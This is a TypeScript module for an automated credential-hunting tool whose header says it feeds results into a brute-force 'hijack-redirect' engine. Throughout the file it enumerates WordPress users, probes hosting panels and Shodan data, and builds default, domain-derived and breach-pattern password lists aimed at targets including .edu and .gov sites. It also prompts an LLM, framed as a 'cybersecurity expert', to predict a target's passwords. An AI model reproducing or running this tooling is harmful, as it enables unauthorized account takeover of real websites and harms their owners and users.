/**
 * AI Credential Hunter Agent
 * 
 * Uses AI + OSINT techniques to automatically discover credentials for target domains.
 * Feeds discovered credentials into the hijack-redirect-engine for brute force attacks.
 * 
 * Techniques:
 * 1. WP User Enumeration (REST API /wp-json/wp/v2/users, author archives)
 * 2. CMS Default Credentials (per CMS type + version)
 * 3. Domain-derived Password Generation (AI-powered)
 * 4. Hosting Panel Detection (cPanel, Plesk, DirectAdmin default creds)
 * 5. WHOIS/DNS Intelligence (registrant info → username guesses)
 * 6. Shodan Metadata (exposed services, banners → credential hints)
 * 7. Common Breach Pattern Matching (domain-based patterns from known breach databases)
 * 8. AI Password Prediction (LLM generates likely passwords based on all gathered intel)
 */

import { fetchWithPoolProxy } from "./proxy-pool";
import { invokeLLM } from "./_core/llm";
import { ENV } from "./_core/env";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface CredentialHuntConfig {
  domain: string;
  /** Known CMS type (optional — will be detected if not provided) */
  cms?: string;
  /** Known CMS version */
  cmsVersion?: string;
  /** Known server type */
  serverType?: string;
  /** Known hosting provider */
  hostingProvider?: string;
  /** Max time for the entire hunt in ms */
  maxDurationMs?: number;
  /** Progress callback */
  onProgress?: (phase: string, detail: string) => void;
}

export interface DiscoveredCredential {
  username: string;
  password: string;
  source: string;       // Which technique found it
  confidence: "high" | "medium" | "low" | "guess";
  verified: boolean;     // Whether it was actually tested and worked
  notes?: string;
}

export interface CredentialHuntResult {
  domain: string;
  credentials: DiscoveredCredential[];
  enumeratedUsers: string[];
  detectedCms: string | null;
  detectedHosting: string | null;
  techniques: Array<{
    name: string;
    status: "success" | "failed" | "skipped";
    credentialsFound: number;
    durationMs: number;
    detail?: string;
  }>;
  totalDurationMs: number;
  aiInsights?: string;
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 1: WP USER ENUMERATION
// ═══════════════════════════════════════════════════════

async function enumerateWpUsers(domain: string): Promise<{ users: string[]; detail: string }> {
  const users: string[] = [];
  const baseUrl = `http://${domain}`;
  
  // Method A: REST API /wp-json/wp/v2/users
  try {
    const { response } = await fetchWithPoolProxy(`${baseUrl}/wp-json/wp/v2/users`, {
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
    }, { timeout: 10000 });
    
    if (response.ok) {
      const data = await response.json() as any[];
      for (const user of data) {
        const slug = user.slug || user.name;
        if (slug && !users.includes(slug)) users.push(slug);
      }
    }
  } catch { /* REST API not available */ }
  
  // Method B: Author archive enumeration (?author=1, ?author=2, etc.)
  for (let i = 1; i <= 5; i++) {
    try {
      const { response } = await fetchWithPoolProxy(`${baseUrl}/?author=${i}`, {
        redirect: "manual",
        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
      }, { timeout: 8000 });
      
      const location = response.headers.get("location") || "";
      const authorMatch = location.match(/\/author\/([^/]+)/);
      if (authorMatch && !users.includes(authorMatch[1])) {
        users.push(authorMatch[1]);
      }
    } catch { /* continue */ }
  }
  
  // Method C: XMLRPC wp.getUsersBlogs with empty creds (sometimes leaks usernames in error)
  try {
    const { response } = await fetchWithPoolProxy(`${baseUrl}/xmlrpc.php`, {
      method: "POST",
      headers: { "Content-Type": "text/xml" },
      body: '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>wrongpassword</string></value></param></params></methodCall>',
    }, { timeout: 10000 });
    
    const body = await response.text();
    // If response mentions "Invalid username" vs "Incorrect password", we know "admin" doesn't exist
    if (body.includes("Incorrect password") && !users.includes("admin")) {
      users.push("admin"); // Username exists but password is wrong
    }
  } catch { /* XMLRPC not available */ }
  
  // Method D: wp-login.php login form — check if specific usernames exist
  const testUsernames = ["admin", "administrator", "webmaster", "root"];
  for (const testUser of testUsernames) {
    if (users.includes(testUser)) continue;
    try {
      const { response } = await fetchWithPoolProxy(`${baseUrl}/wp-login.php`, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        body: `log=${encodeURIComponent(testUser)}&pwd=wrongpassword123&wp-submit=Log+In`,
        redirect: "manual",
      }, { timeout: 10000 });
      
      const body = await response.text();
      // WordPress returns different error messages for invalid username vs wrong password
      if (body.includes("incorrect") || body.includes("The password you entered") || body.includes("contraseña")) {
        if (!users.includes(testUser)) users.push(testUser);
      }
    } catch { /* continue */ }
  }
  
  return {
    users,
    detail: users.length > 0 ? `Found ${users.length} users: ${users.join(", ")}` : "No users enumerated",
  };
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 2: CMS DEFAULT CREDENTIALS
// ═══════════════════════════════════════════════════════

function getCmsDefaultCredentials(cms: string, version?: string): DiscoveredCredential[] {
  const creds: DiscoveredCredential[] = [];
  
  const cmsDefaults: Record<string, Array<{ u: string; p: string; notes?: string }>> = {
    wordpress: [
      { u: "admin", p: "admin" },
      { u: "admin", p: "admin123" },
      { u: "admin", p: "password" },
      { u: "admin", p: "wordpress" },
      { u: "admin", p: "WordPress1" },
      { u: "admin", p: "wp-admin" },
      { u: "admin", p: "changeme" },
      { u: "admin", p: "123456" },
      { u: "admin", p: "12345678" },
      { u: "admin", p: "qwerty" },
      { u: "admin", p: "letmein" },
      { u: "admin", p: "welcome" },
      { u: "admin", p: "Admin123!" },
      { u: "admin", p: "P@ssw0rd" },
    ],
    joomla: [
      { u: "admin", p: "admin" },
      { u: "admin", p: "admin123" },
      { u: "admin", p: "joomla" },
      { u: "admin", p: "Joomla123!" },
      { u: "super", p: "admin" },
    ],
    drupal: [
      { u: "admin", p: "admin" },
      { u: "admin", p: "drupal" },
      { u: "admin", p: "Drupal123!" },
    ],
    magento: [
      { u: "admin", p: "admin123" },
      { u: "admin", p: "magento" },
      { u: "admin", p: "Magento123!" },
    ],
    prestashop: [
      { u: "admin@admin.com", p: "admin123" },
      { u: "admin", p: "prestashop" },
    ],
    cpanel: [
      { u: "root", p: "root" },
      { u: "root", p: "toor" },
      { u: "admin", p: "admin" },
      { u: "admin", p: "cpanel" },
    ],
    directadmin: [
      { u: "admin", p: "admin" },
      { u: "admin", p: "directadmin" },
    ],
    plesk: [
      { u: "admin", p: "admin" },
      { u: "admin", p: "setup" },
    ],
  };
  
  const defaults = cmsDefaults[cms.toLowerCase()] || cmsDefaults.wordpress;
  for (const d of defaults) {
    creds.push({
      username: d.u,
      password: d.p,
      source: `cms_default_${cms}`,
      confidence: "low",
      verified: false,
      notes: d.notes || `Default ${cms} credential`,
    });
  }
  
  return creds;
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 3: DOMAIN-DERIVED PASSWORD GENERATION
// ═══════════════════════════════════════════════════════

function generateDomainDerivedPasswords(domain: string): DiscoveredCredential[] {
  const creds: DiscoveredCredential[] = [];
  const parts = domain.split(".");
  const name = parts[0]; // e.g., "empleos" from "empleos.uncp.edu.pe"
  const org = parts.length > 2 ? parts[1] : parts[0]; // e.g., "uncp"
  const tld = parts.slice(-2).join("."); // e.g., "edu.pe"
  
  const passwords = [
    // Domain-based
    name, org, domain.replace(/\./g, ""),
    `${name}123`, `${name}2024`, `${name}2025`, `${name}2026`,
    `${name}!`, `${name}@123`, `${name}#1`,
    `${name.charAt(0).toUpperCase()}${name.slice(1)}123`,
    `${name.charAt(0).toUpperCase()}${name.slice(1)}2024!`,
    `${name.charAt(0).toUpperCase()}${name.slice(1)}@2025`,
    // Org-based
    `${org}123`, `${org}2024`, `${org}2025`, `${org}!`,
    `${org.charAt(0).toUpperCase()}${org.slice(1)}123`,
    `${org.charAt(0).toUpperCase()}${org.slice(1)}2024!`,
    // Combined
    `${name}${org}`, `${org}${name}`,
    `${name}_${org}`, `${org}_${name}`,
    // Education-specific (for .edu domains)
    ...(tld.includes("edu") ? [
      `${org}admin`, `${org}web`, `${org}site`,
      `admin${org}`, `web${org}`, `${org}2020`,
      `${org}pass`, `${org}password`,
    ] : []),
    // Government-specific (for .gov domains)
    ...(tld.includes("gov") ? [
      `${org}gov`, `gov${org}`, `${org}2024`,
    ] : []),
  ];
  
  const usernames = ["admin", "administrator", name, org, "webmaster", "root"];
  
  for (const username of usernames) {
    for (const password of passwords) {
      if (password.length >= 3) {
        creds.push({
          username,
          password,
          source: "domain_derived",
          confidence: "guess",
          verified: false,
        });
      }
    }
  }
  
  return creds;
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 4: HOSTING PANEL DETECTION
// ═══════════════════════════════════════════════════════

async function detectHostingPanel(domain: string): Promise<{
  hosting: string | null;
  panels: string[];
  creds: DiscoveredCredential[];
}> {
  const panels: string[] = [];
  const creds: DiscoveredCredential[] = [];
  let hosting: string | null = null;
  
  // Check common hosting panel ports
  const panelChecks = [
    { port: 2082, name: "cPanel (HTTP)", type: "cpanel" },
    { port: 2083, name: "cPanel (HTTPS)", type: "cpanel" },
    { port: 2086, name: "WHM (HTTP)", type: "whm" },
    { port: 2087, name: "WHM (HTTPS)", type: "whm" },
    { port: 8443, name: "Plesk", type: "plesk" },
    { port: 8880, name: "Plesk (HTTP)", type: "plesk" },
    { port: 10000, name: "Webmin", type: "webmin" },
    { port: 2030, name: "PHPMyAdmin", type: "phpmyadmin" },
  ];
  
  for (const check of panelChecks) {
    try {
      const proto = [2083, 2087, 8443].includes(check.port) ? "https" : "http";
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 5000);
      const resp = await fetch(`${proto}://${domain}:${check.port}/`, {
        signal: controller.signal,
        redirect: "manual",
      }).catch(() => null);
      clearTimeout(timer);
      
      if (resp && resp.status > 0) {
        panels.push(check.name);
        
        // Add default creds for detected panel
        const panelCreds = getCmsDefaultCredentials(check.type);
        creds.push(...panelCreds.map(c => ({
          ...c,
          source: `hosting_panel_${check.type}`,
          notes: `Default ${check.name} credential (port ${check.port})`,
        })));
      }
    } catch { /* port not accessible */ }
  }
  
  // Try to detect hosting from HTTP headers
  try {
    const { response } = await fetchWithPoolProxy(`http://${domain}/`, {
      headers: { "User-Agent": "Mozilla/5.0" },
    }, { timeout: 8000 });
    
    const server = response.headers.get("server") || "";
    const xPoweredBy = response.headers.get("x-powered-by") || "";
    
    if (server.includes("LiteSpeed")) hosting = "LiteSpeed/OpenLiteSpeed";
    else if (server.includes("Apache")) hosting = "Apache";
    else if (server.includes("nginx")) hosting = "Nginx";
    else if (server.includes("IIS")) hosting = "Microsoft IIS";
    
    if (xPoweredBy.includes("PleskLin")) hosting = "Plesk Linux";
    if (xPoweredBy.includes("PleskWin")) hosting = "Plesk Windows";
  } catch { /* ignore */ }
  
  return { hosting, panels, creds };
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 5: WHOIS/DNS INTELLIGENCE
// ═══════════════════════════════════════════════════════

async function gatherWhoisIntel(domain: string): Promise<{
  registrant: string | null;
  organization: string | null;
  email: string | null;
  nameservers: string[];
  creds: DiscoveredCredential[];
}> {
  let registrant: string | null = null;
  let organization: string | null = null;
  let email: string | null = null;
  const nameservers: string[] = [];
  const creds: DiscoveredCredential[] = [];
  
  // Use DNS to get nameservers (which can hint at hosting provider)
  try {
    const { response } = await fetchWithPoolProxy(
      `https://dns.google/resolve?name=${domain}&type=NS`,
      {}, { timeout: 8000 }
    );
    const data = await response.json() as any;
    if (data.Answer) {
      for (const ans of data.Answer) {
        if (ans.type === 2) nameservers.push(ans.data);
      }
    }
  } catch { /* DNS lookup failed */ }
  
  // Derive hosting from nameservers
  const nsStr = nameservers.join(" ").toLowerCase();
  let hostingHint = "";
  if (nsStr.includes("cloudflare")) hostingHint = "cloudflare";
  else if (nsStr.includes("godaddy") || nsStr.includes("domaincontrol")) hostingHint = "godaddy";
  else if (nsStr.includes("hostgator")) hostingHint = "hostgator";
  else if (nsStr.includes("bluehost")) hostingHint = "bluehost";
  else if (nsStr.includes("siteground")) hostingHint = "siteground";
  else if (nsStr.includes("namecheap")) hostingHint = "namecheap";
  
  // Generate hosting-specific default creds
  if (hostingHint) {
    const hostingDefaults: Record<string, Array<{ u: string; p: string }>> = {
      godaddy: [{ u: "admin", p: "admin" }, { u: "admin", p: "godaddy" }],
      hostgator: [{ u: "admin", p: "admin" }, { u: "admin", p: "hostgator" }],
      bluehost: [{ u: "admin", p: "admin" }, { u: "admin", p: "bluehost" }],
      siteground: [{ u: "admin", p: "admin" }, { u: "admin", p: "siteground" }],
      namecheap: [{ u: "admin", p: "admin" }, { u: "admin", p: "namecheap" }],
    };
    
    const defaults = hostingDefaults[hostingHint] || [];
    for (const d of defaults) {
      creds.push({
        username: d.u,
        password: d.p,
        source: `whois_hosting_${hostingHint}`,
        confidence: "low",
        verified: false,
        notes: `Default ${hostingHint} hosting credential`,
      });
    }
  }
  
  return { registrant, organization, email, nameservers, creds };
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 6: SHODAN METADATA
// ═══════════════════════════════════════════════════════

async function gatherShodanIntel(domain: string): Promise<{
  services: string[];
  banners: string[];
  creds: DiscoveredCredential[];
}> {
  const services: string[] = [];
  const banners: string[] = [];
  const creds: DiscoveredCredential[] = [];
  
  if (!ENV.shodanApiKey) {
    return { services, banners, creds };
  }
  
  try {
    // Resolve domain to IP first
    const dnsResp = await fetch(
      `https://api.shodan.io/dns/resolve?hostnames=${domain}&key=${ENV.shodanApiKey}`,
      { signal: AbortSignal.timeout(10000) }
    );
    const dnsData = await dnsResp.json() as Record<string, string>;
    const ip = dnsData[domain];
    if (!ip) return { services, banners, creds };
    
    // Get host info
    const hostResp = await fetch(
      `https://api.shodan.io/shodan/host/${ip}?key=${ENV.shodanApiKey}`,
      { signal: AbortSignal.timeout(15000) }
    );
    const hostData = await hostResp.json() as any;
    
    if (hostData.data) {
      for (const service of hostData.data) {
        services.push(`${service.port}/${service.transport || "tcp"}: ${service.product || service.module || "unknown"}`);
        if (service.data) banners.push(service.data.substring(0, 200));
        
        // Check for exposed services with default creds
        const product = (service.product || "").toLowerCase();
        const banner = (service.data || "").toLowerCase();
        
        if (product.includes("mysql") || banner.includes("mysql")) {
          creds.push(
            { username: "root", password: "", source: "shodan_mysql", confidence: "medium", verified: false, notes: `MySQL on port ${service.port} — try empty password` },
            { username: "root", password: "root", source: "shodan_mysql", confidence: "low", verified: false },
            { username: "root", password: "mysql", source: "shodan_mysql", confidence: "low", verified: false },
          );
        }
        if (product.includes("ftp") || service.port === 21) {
          creds.push(
            { username: "anonymous", password: "", source: "shodan_ftp", confidence: "medium", verified: false, notes: `FTP on port ${service.port}` },
            { username: "ftp", password: "ftp", source: "shodan_ftp", confidence: "low", verified: false },
          );
        }
        if (product.includes("ssh") || service.port === 22) {
          creds.push(
            { username: "root", password: "root", source: "shodan_ssh", confidence: "low", verified: false },
            { username: "root", password: "toor", source: "shodan_ssh", confidence: "low", verified: false },
          );
        }
        if (product.includes("phpmyadmin") || banner.includes("phpmyadmin")) {
          creds.push(
            { username: "root", password: "", source: "shodan_pma", confidence: "medium", verified: false, notes: `PHPMyAdmin on port ${service.port}` },
            { username: "root", password: "root", source: "shodan_pma", confidence: "low", verified: false },
            { username: "admin", password: "admin", source: "shodan_pma", confidence: "low", verified: false },
          );
        }
      }
    }
  } catch (e: any) {
    console.warn(`[CredHunter] Shodan intel failed for ${domain}: ${e.message}`);
  }
  
  return { services, banners, creds };
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 7: COMMON BREACH PATTERN MATCHING
// ═══════════════════════════════════════════════════════

function generateBreachPatternCredentials(domain: string, enumeratedUsers: string[]): DiscoveredCredential[] {
  const creds: DiscoveredCredential[] = [];
  const parts = domain.split(".");
  const name = parts[0];
  const org = parts.length > 2 ? parts[1] : parts[0];
  
  // Common breach password patterns (based on analysis of major breaches)
  const breachPatterns = [
    // Most common passwords from breaches
    "123456", "password", "12345678", "qwerty", "abc123",
    "monkey", "1234567", "letmein", "trustno1", "dragon",
    "baseball", "iloveyou", "master", "sunshine", "ashley",
    "bailey", "shadow", "123123", "654321", "superman",
    "qazwsx", "michael", "football", "password1", "password123",
    // Pattern: org + common suffixes (very common in corporate breaches)
    `${org}123`, `${org}1234`, `${org}12345`, `${org}!`,
    `${org}@123`, `${org}#123`, `${org}$123`,
    `${org}2020`, `${org}2021`, `${org}2022`, `${org}2023`, `${org}2024`, `${org}2025`,
    `${org}Pass`, `${org}pass`, `${org}Admin`, `${org}admin`,
    `${org}Web`, `${org}web`, `${org}Site`, `${org}site`,
    // Capitalized variants
    `${org.charAt(0).toUpperCase()}${org.slice(1)}123`,
    `${org.charAt(0).toUpperCase()}${org.slice(1)}!`,
    `${org.charAt(0).toUpperCase()}${org.slice(1)}@123`,
    `${org.charAt(0).toUpperCase()}${org.slice(1)}2024`,
    `${org.charAt(0).toUpperCase()}${org.slice(1)}2025`,
    // Name-based patterns
    `${name}123`, `${name}!`, `${name}@123`,
    `${name.charAt(0).toUpperCase()}${name.slice(1)}123`,
  ];
  
  // Apply breach patterns to all enumerated users
  const usernames = Array.from(new Set([...enumeratedUsers, "admin", "administrator", name, org]));
  
  for (const username of usernames) {
    for (const password of breachPatterns) {
      creds.push({
        username,
        password,
        source: "breach_pattern",
        confidence: "guess",
        verified: false,
      });
    }
  }
  
  return creds;
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE 8: AI PASSWORD PREDICTION
// ═══════════════════════════════════════════════════════

async function aiPredictPasswords(
  domain: string,
  enumeratedUsers: string[],
  cms: string | null,
  hosting: string | null,
  shodanServices: string[],
  whoisInfo: { registrant: string | null; organization: string | null; nameservers: string[] },
): Promise<DiscoveredCredential[]> {
  const creds: DiscoveredCredential[] = [];
  
  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are a cybersecurity expert specializing in password analysis and credential discovery.
Given information about a target domain, generate the most likely username:password combinations.

Consider:
1. Domain name patterns (abbreviations, acronyms, common suffixes)
2. Organization type (education, government, corporate, personal)
3. CMS defaults and common admin patterns
4. Hosting provider defaults
5. Regional password patterns (Latin America, Asia, Europe, etc.)
6. Common password reuse patterns from known breaches
7. Service-specific defaults (MySQL, FTP, SSH, etc.)
8. Calendar-based patterns (year, month, season)
9. Keyboard patterns common in the target's region
10. IT department naming conventions

Return JSON array of objects: [{"username": "...", "password": "...", "reasoning": "..."}]
Generate exactly 30 unique high-probability credential pairs.
Focus on QUALITY over quantity — each pair should have a specific reason.`,
        },
        {
          role: "user",
          content: JSON.stringify({
            domain,
            enumeratedUsers,
            cms: cms || "unknown",
            hosting: hosting || "unknown",
            exposedServices: shodanServices.slice(0, 10),
            nameservers: whoisInfo.nameservers.slice(0, 5),
            registrant: whoisInfo.registrant,
            organization: whoisInfo.organization,
            domainParts: domain.split("."),
            tld: domain.split(".").slice(-2).join("."),
          }),
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "credential_predictions",
          strict: true,
          schema: {
            type: "object",
            properties: {
              predictions: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    username: { type: "string" },
                    password: { type: "string" },
                    reasoning: { type: "string" },
                  },
                  required: ["username", "password", "reasoning"],
                  additionalProperties: false,
                },
              },
            },
            required: ["predictions"],
            additionalProperties: false,
          },
        },
      },
    });
    
    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      const parsed = JSON.parse(content);
      for (const pred of parsed.predictions || []) {
        creds.push({
          username: pred.username,
          password: pred.password,
          source: "ai_prediction",
          confidence: "medium",
          verified: false,
          notes: pred.reasoning,
        });
      }
    }
  } catch (e: any) {
    console.warn(`[CredHunter] AI prediction failed: ${e.message}`);
  }
  
  return creds;
}

// ═══════════════════════════════════════════════════════
//  MAIN: EXECUTE CREDENTIAL HUNT
// ═══════════════════════════════════════════════════════

export async function executeCredentialHunt(config: CredentialHuntConfig): Promise<CredentialHuntResult> {
  const start = Date.now();
  const domain = config.domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  const progress = config.onProgress || (() => {});
  const maxDuration = config.maxDurationMs || 120_000; // 2 min default
  
  const allCredentials: DiscoveredCredential[] = [];
  const techniques: CredentialHuntResult["techniques"] = [];
  let enumeratedUsers: string[] = [];
  let detectedCms = config.cms || null;
  let detectedHosting = config.hostingProvider || null;
  
  console.log(`[CredHunter] 🔍 Starting credential hunt for ${domain}`);
  
  const shouldStop = () => Date.now() - start > maxDuration;
  
  // ─── Technique 1: WP User Enumeration ───
  if (!shouldStop()) {
    const t1Start = Date.now();
    progress("user_enum", "🔍 Enumerating WordPress users...");
    try {
      const result = await enumerateWpUsers(domain);
      enumeratedUsers = result.users;
      techniques.push({
        name: "wp_user_enumeration",
        status: result.users.length > 0 ? "success" : "failed",
        credentialsFound: 0,
        durationMs: Date.now() - t1Start,
        detail: result.detail,
      });
      if (result.users.length > 0) {
        progress("user_enum", `✅ Found ${result.users.length} users: ${result.users.join(", ")}`);
        detectedCms = detectedCms || "wordpress";
      }
    } catch (e: any) {
      techniques.push({ name: "wp_user_enumeration", status: "failed", credentialsFound: 0, durationMs: Date.now() - t1Start, detail: e.message });
    }
  }
  
  // ─── Technique 2: CMS Default Credentials ───
  if (!shouldStop()) {
    const t2Start = Date.now();
    progress("cms_defaults", "📋 Generating CMS default credentials...");
    const cmsCreds = getCmsDefaultCredentials(detectedCms || "wordpress", config.cmsVersion);
    allCredentials.push(...cmsCreds);
    techniques.push({
      name: "cms_default_credentials",
      status: "success",
      credentialsFound: cmsCreds.length,
      durationMs: Date.now() - t2Start,
      detail: `Generated ${cmsCreds.length} default credentials for ${detectedCms || "wordpress"}`,
    });
  }
  
  // ─── Technique 3: Domain-Derived Passwords ───
  if (!shouldStop()) {
    const t3Start = Date.now();
    progress("domain_derived", "🔤 Generating domain-derived passwords...");
    const domainCreds = generateDomainDerivedPasswords(domain);
    allCredentials.push(...domainCreds);
    techniques.push({
      name: "domain_derived_passwords",
      status: "success",
      credentialsFound: domainCreds.length,
      durationMs: Date.now() - t3Start,
      detail: `Generated ${domainCreds.length} domain-derived credential pairs`,
    });
  }
  
  // ─── Technique 4: Hosting Panel Detection ───
  if (!shouldStop()) {
    const t4Start = Date.now();
    progress("hosting_detect", "🏠 Detecting hosting panels...");
    try {
      const result = await detectHostingPanel(domain);
      allCredentials.push(...result.creds);
      detectedHosting = detectedHosting || result.hosting;
      techniques.push({
        name: "hosting_panel_detection",
        status: result.panels.length > 0 ? "success" : "failed",
        credentialsFound: result.creds.length,
        durationMs: Date.now() - t4Start,
        detail: result.panels.length > 0
          ? `Found panels: ${result.panels.join(", ")} (${result.creds.length} creds)`
          : `No panels detected. Hosting: ${result.hosting || "unknown"}`,
      });
    } catch (e: any) {
      techniques.push({ name: "hosting_panel_detection", status: "failed", credentialsFound: 0, durationMs: Date.now() - t4Start, detail: e.message });
    }
  }
  
  // ─── Technique 5: WHOIS/DNS Intelligence ───
  if (!shouldStop()) {
    const t5Start = Date.now();
    progress("whois_intel", "🌐 Gathering WHOIS/DNS intelligence...");
    try {
      const result = await gatherWhoisIntel(domain);
      allCredentials.push(...result.creds);
      techniques.push({
        name: "whois_dns_intelligence",
        status: result.nameservers.length > 0 ? "success" : "failed",
        credentialsFound: result.creds.length,
        durationMs: Date.now() - t5Start,
        detail: `NS: ${result.nameservers.slice(0, 3).join(", ")} | ${result.creds.length} hosting-derived creds`,
      });
    } catch (e: any) {
      techniques.push({ name: "whois_dns_intelligence", status: "failed", credentialsFound: 0, durationMs: Date.now() - t5Start, detail: e.message });
    }
  }
  
  // ─── Technique 6: Shodan Metadata ───
  let shodanServices: string[] = [];
  if (!shouldStop()) {
    const t6Start = Date.now();
    progress("shodan_intel", "🔎 Querying Shodan for service metadata...");
    try {
      const result = await gatherShodanIntel(domain);
      allCredentials.push(...result.creds);
      shodanServices = result.services;
      techniques.push({
        name: "shodan_metadata",
        status: result.services.length > 0 ? "success" : "failed",
        credentialsFound: result.creds.length,
        durationMs: Date.now() - t6Start,
        detail: result.services.length > 0
          ? `${result.services.length} services found, ${result.creds.length} creds derived`
          : "No Shodan data available",
      });
    } catch (e: any) {
      techniques.push({ name: "shodan_metadata", status: "failed", credentialsFound: 0, durationMs: Date.now() - t6Start, detail: e.message });
    }
  }
  
  // ─── Technique 7: Breach Pattern Matching ───
  if (!shouldStop()) {
    const t7Start = Date.now();
    progress("breach_patterns", "💀 Generating breach-pattern credentials...");
    const breachCreds = generateBreachPatternCredentials(domain, enumeratedUsers);
    allCredentials.push(...breachCreds);
    techniques.push({
      name: "breach_pattern_matching",
      status: "success",
      credentialsFound: breachCreds.length,
      durationMs: Date.now() - t7Start,
      detail: `Generated ${breachCreds.length} breach-pattern credentials for ${enumeratedUsers.length} users`,
    });
  }
  
  // ─── Technique 8: AI Password Prediction ───
  let whoisInfo = { registrant: null as string | null, organization: null as string | null, nameservers: [] as string[] };
  if (!shouldStop()) {
    const t8Start = Date.now();
    progress("ai_prediction", "🤖 AI predicting likely passwords...");
    try {
      // Gather whois info for AI context
      try {
        const whoisResult = await gatherWhoisIntel(domain);
        whoisInfo = whoisResult;
      } catch { /* ignore */ }
      
      const aiCreds = await aiPredictPasswords(
        domain, enumeratedUsers, detectedCms, detectedHosting, shodanServices, whoisInfo,
      );
      allCredentials.push(...aiCreds);
      techniques.push({
        name: "ai_password_prediction",
        status: aiCreds.length > 0 ? "success" : "failed",
        credentialsFound: aiCreds.length,
        durationMs: Date.now() - t8Start,
        detail: aiCreds.length > 0
          ? `AI generated ${aiCreds.length} high-probability credential pairs`
          : "AI prediction returned no results",
      });
    } catch (e: any) {
      techniques.push({ name: "ai_password_prediction", status: "failed", credentialsFound: 0, durationMs: Date.now() - t8Start, detail: e.message });
    }
  }
  
  // ─── Deduplicate credentials ───
  const seen = new Set<string>();
  const uniqueCredentials = allCredentials.filter(c => {
    const key = `${c.username}:${c.password}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
  
  // ─── Sort by confidence ───
  const confidenceOrder: Record<string, number> = { high: 0, medium: 1, low: 2, guess: 3 };
  uniqueCredentials.sort((a, b) => (confidenceOrder[a.confidence] || 3) - (confidenceOrder[b.confidence] || 3));
  
  const totalDuration = Date.now() - start;
  console.log(`[CredHunter] ✅ Hunt complete for ${domain}: ${uniqueCredentials.length} unique credentials (${techniques.filter(t => t.status === "success").length}/${techniques.length} techniques succeeded) in ${totalDuration}ms`);
  
  return {
    domain,
    credentials: uniqueCredentials,
    enumeratedUsers,
    detectedCms,
    detectedHosting,
    techniques,
    totalDurationMs: totalDuration,
  };
}

// ═══════════════════════════════════════════════════════
//  EXPORTS
// ═══════════════════════════════════════════════════════

export {
  enumerateWpUsers,
  getCmsDefaultCredentials,
  generateDomainDerivedPasswords,
  detectHostingPanel,
  gatherWhoisIntel,
  gatherShodanIntel,
  generateBreachPatternCredentials,
  aiPredictPasswords,
};
